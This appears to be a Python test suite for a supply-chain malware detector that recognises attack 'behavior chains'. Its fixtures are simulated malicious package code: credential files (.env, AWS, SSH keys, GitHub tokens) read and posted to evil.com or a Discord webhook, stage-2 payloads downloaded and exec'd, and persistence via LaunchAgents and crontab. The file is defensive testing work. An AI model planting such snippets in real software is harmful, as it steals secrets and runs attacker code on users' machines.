"""Tests for behavior chain detection — API-agnostic attack pattern matching."""

from __future__ import annotations

from aigate.rules.behavior_chains import detect_behavior_chains


class TestAxiosAttackDetected:
    """Simulate axios 1.14.1 supply chain attack — download, write, execute, persist."""

    def test_rat_deployment_chain(self) -> None:
        source_files = {
            "axios-1.14.1/lib/install.js": (
                "const https = require('https');\n"
                "https.get('http://evil.com/payload', (res) => {\n"
                "  let data = '';\n"
                "  res.on('data', (chunk) => data += chunk);\n"
                "  res.on('end', () => {\n"
                "    fs.writeFileSync('/tmp/payload.sh', data);\n"
                "    const { execSync } = require('child_process');\n"
                "    execSync('chmod +x /tmp/payload.sh');\n"
                "  });\n"
                "});\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        chain_ids = {m.chain_id for m in matches}
        assert "rat-deployment" in chain_ids
        # Should also match sub-chains
        assert "dropper" in chain_ids


class TestLitellmAttackDetected:
    """Simulate litellm credential theft — read .env + exfiltrate."""

    def test_credential_theft_chain(self) -> None:
        source_files = {
            "litellm-0.1.0/litellm/proxy.py": (
                "import os\n"
                "import requests\n"
                "secrets = open('.env').read()\n"
                "aws_creds = open(os.path.expanduser('~/.aws/credentials')).read()\n"
                "requests.post('https://evil.com/collect', data=secrets)\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        chain_ids = {m.chain_id for m in matches}
        assert "credential-theft" in chain_ids


class TestW4spAttackDetected:
    """Simulate W4SP stealer — decode obfuscated payload, steal creds, exfiltrate.

    Note: after tightening download patterns (GET-only for HTTP libs),
    this fixture no longer has a "download" behavior — requests.post is
    exfiltration, not download.  Matched chains: obfuscated-execution,
    credential-theft, staged-credential-theft.
    """

    def test_obfuscated_execution_and_credential_theft(self) -> None:
        source_files = {
            "w4sp-stealer/setup.py": (
                "import base64, os, subprocess\n"
                "payload = base64.b64decode('aW1wb3J0IG9z...')\n"
                "exec(payload)\n"
                "# Also reads browser cookies\n"
                "cookies = open(os.path.expanduser('~/.gnupg/secret')).read()\n"
                "import requests\n"
                "requests.post('https://discord.com/api/webhooks/12345', data=cookies)\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        chain_ids = {m.chain_id for m in matches}
        assert "obfuscated-execution" in chain_ids
        assert "credential-theft" in chain_ids


class TestNormalLibraryNotFlagged:
    """Normal library code with requests.get + json should NOT match any chain."""

    def test_no_chain_match(self) -> None:
        source_files = {
            "mylib-1.0/mylib/client.py": (
                "import requests\n"
                "import json\n"
                "\n"
                "def get_data(url: str) -> dict:\n"
                "    resp = requests.get(url)\n"
                "    return json.loads(resp.text)\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        assert matches == []


class TestDropperChain:
    """Download + execute in same file → 'dropper' HIGH."""

    def test_dropper_high_severity(self) -> None:
        source_files = {
            "evil-pkg/setup.py": (
                "import urllib.request\n"
                "code = urllib.request.urlopen('http://evil.com/stage2').read()\n"
                "exec(code)\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        chain_ids = {m.chain_id for m in matches}
        assert "dropper" in chain_ids
        dropper = next(m for m in matches if m.chain_id == "dropper")
        assert dropper.severity == "high"


class TestCredentialTheftChain:
    """.ssh/ read + requests.post → 'credential-theft' CRITICAL."""

    def test_credential_theft_critical(self) -> None:
        source_files = {
            "evil-pkg/steal.py": (
                "import os, requests\n"
                "ssh_key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
                "requests.post('https://evil.com/keys', data=ssh_key)\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        chain_ids = {m.chain_id for m in matches}
        assert "credential-theft" in chain_ids
        cred = next(m for m in matches if m.chain_id == "credential-theft")
        assert cred.severity == "critical"


class TestCrossFileNoMatch:
    """Download in file A, execute in file B → no match (file-scoped)."""

    def test_cross_file_not_matched(self) -> None:
        source_files = {
            "pkg/downloader.py": (
                "import urllib.request\nurllib.request.urlopen('http://example.com/data')\n"
            ),
            "pkg/runner.py": ("import subprocess\nsubprocess.run(['python', 'script.py'])\n"),
        }
        matches = detect_behavior_chains(source_files)
        assert matches == []


class TestSingleBehaviorNoChain:
    """Only download, no execute → no chain match."""

    def test_single_behavior_no_match(self) -> None:
        source_files = {
            "pkg/fetch.py": ("import httpx\nresp = httpx.get('https://api.example.com/data')\n"),
        }
        matches = detect_behavior_chains(source_files)
        assert matches == []


class TestObfuscatedExecutionChain:
    """Decode + execute → 'obfuscated-execution' HIGH."""

    def test_obfuscated_execution(self) -> None:
        source_files = {
            "evil/loader.py": (
                "import base64\ncode = base64.b64decode(encoded_payload)\nexec(code)\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        chain_ids = {m.chain_id for m in matches}
        assert "obfuscated-execution" in chain_ids


class TestPersistentBackdoorChain:
    """Execute + persist → 'persistent-backdoor' CRITICAL."""

    def test_persistent_backdoor(self) -> None:
        source_files = {
            "evil/persist.js": (
                "const { execSync } = require('child_process');\n"
                "execSync('echo malware > /Library/LaunchAgents/com.evil.plist');\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        chain_ids = {m.chain_id for m in matches}
        assert "persistent-backdoor" in chain_ids


class TestChainMatchContainsFileAndBehaviors:
    """Verify BehaviorChainMatch has correct file path and detected behaviors."""

    def test_match_metadata(self) -> None:
        source_files = {
            "evil/steal.py": (
                "import os, requests\n"
                "token = os.environ.get('GITHUB_TOKEN')\n"
                "requests.post('https://evil.com/tokens', data=token)\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        assert len(matches) >= 1
        cred_match = next(m for m in matches if m.chain_id == "credential-theft")
        assert cred_match.file_path == "evil/steal.py"
        assert "credential_access" in cred_match.detected_behaviors
        assert "exfiltrate" in cred_match.detected_behaviors


class TestSkipNonCodeFiles:
    """Markdown and config files should be skipped even if they contain patterns."""

    def test_skip_markdown(self) -> None:
        source_files = {
            "pkg/README.md": (
                "# Usage\n"
                "```python\n"
                "import subprocess\n"
                "subprocess.run(['python', '-c', 'exec(payload)'])\n"
                "requests.post('http://example.com', data=open('.env').read())\n"
                "```\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        assert matches == []


class TestFullAttackChain:
    """All 5 stages: download → decode → write → execute → persist."""

    def test_full_chain_critical(self) -> None:
        source_files = {
            "trojan/install.py": (
                "import urllib.request, base64, os, subprocess\n"
                "encoded = urllib.request.urlopen('http://evil.com/payload').read()\n"
                "payload = base64.b64decode(encoded)\n"
                "with open('/tmp/backdoor.py', 'w') as f:\n"
                "    f.write(payload.decode())\n"
                "subprocess.run(['python', '/tmp/backdoor.py'])\n"
                "# Add to crontab for persistence\n"
                "os.system('echo \"* * * * * python /tmp/backdoor.py\" | crontab')\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        chain_ids = {m.chain_id for m in matches}
        assert "full-attack-chain" in chain_ids
        full = next(m for m in matches if m.chain_id == "full-attack-chain")
        assert full.severity == "critical"


class TestDownloadAndSaveNotFlagged:
    """requests.get + open().write does NOT trigger dropper (no execute)."""

    def test_download_and_save_not_flagged(self) -> None:
        source_files = {
            "mylib-1.0/mylib/download.py": (
                "import requests\n"
                "\n"
                "def save_data(url: str, path: str) -> None:\n"
                "    resp = requests.get(url)\n"
                "    with open(path, 'w') as f:\n"
                "        f.write(resp.text)\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        chain_ids = {m.chain_id for m in matches}
        # download + write is NOT an attack chain — dropper requires execute
        assert "dropper" not in chain_ids
        assert all(
            m.chain_id not in ("dropper", "encoded-dropper", "rat-deployment") for m in matches
        )


class TestSignalFormatForPrefilter:
    """Verify format_signals() produces strings compatible with prefilter."""

    def test_signal_format(self) -> None:
        source_files = {
            "evil/dropper.py": (
                "import urllib.request\n"
                "code = urllib.request.urlopen('http://evil.com/s2').read()\n"
                "exec(code)\n"
            ),
        }
        matches = detect_behavior_chains(source_files)
        signals = [m.to_signal() for m in matches]
        assert any("behavior_chain(HIGH)" in s for s in signals)
        assert any("dropper" in s for s in signals)
